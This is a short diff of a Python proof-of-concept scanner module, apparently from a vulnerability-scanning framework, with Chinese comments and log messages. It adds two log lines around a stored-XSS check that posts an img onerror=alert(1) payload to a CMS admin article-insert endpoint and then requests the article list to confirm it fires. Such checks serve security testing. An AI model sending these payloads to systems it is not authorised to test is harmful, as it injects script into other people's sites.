@@ -50,7 +50,9 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
+            
             # 构造xss payload 
+            self.output.info('正在构造xss payload')  
             payload1 = "/index.php?s=/admin/articlem/insert/navTabId/listarticle/callbackType/closeCurrent"
             data = '''tid=&title=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E&keyword=cscanpoc&ispush=0&iscommend=1&isslides=0&islock=0&summary=cscanpoc&content=%09%09%09%09%09cscanpoc'''
             vul_url1 = arg + payload1
@@ -61,6 +63,7 @@ class Poc(ABPoc):
             response1 = requests.post(vul_url1,headers=headers,data=data)
 
             # 验证xss是否成功触发
+            self.output.info('验证xss是否成功触发')  
             payload2 = "/index.php?s=/admin/articlem/index.html&_=1532271572256"
             vul_url2 = arg + payload2
             response2 = requests.get(vul_url2,headers=headers)
